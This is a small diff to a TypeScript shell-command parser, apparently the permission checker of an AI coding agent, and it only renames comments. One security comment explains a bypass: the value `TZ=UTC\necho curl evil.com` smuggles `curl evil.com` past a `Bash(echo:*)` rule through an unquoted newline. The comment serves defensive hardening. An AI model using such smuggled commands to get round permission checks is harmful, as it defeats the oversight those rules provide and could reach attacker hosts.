@@ -1052,7 +1052,7 @@ function handleRedirection(
   if (isOperator(part, '>&')) {
     // File descriptor redirect (2>&1) - preserve as-is
     if (isFileDescriptor(prev) && isFileDescriptor(next)) {
-      return { skip: 0, dangerous: false } // Handled in reconstruction
+      return { skip: 0, dangerous: false } // Handled in command rebuild
     }
 
     // >&| POSIX force clobber for combined stdout/stderr
@@ -1175,7 +1175,7 @@ function needsQuoting(str: string): boolean {
   // Quote strings containing ANY whitespace (space, tab, newline, CR, etc.).
   // SECURITY: Must match ALL characters that the regex `\s` class matches.
   // Previously only checked space/tab; downstream consumers like ENV_VAR_PATTERN
-  // use `\s+`. If reconstructCommand emits unquoted `\n` or `\r`, stripSafeWrappers
+  // use `\s+`. If rebuildCommand emits unquoted `\n` or `\r`, stripSafeWrappers
   // matches across it, stripping `TZ=UTC` from `TZ=UTC\necho curl evil.com` —
   // matching `Bash(echo:*)` while bash word-splits on the newline and runs `curl`.
   if (/\s/.test(str)) return true
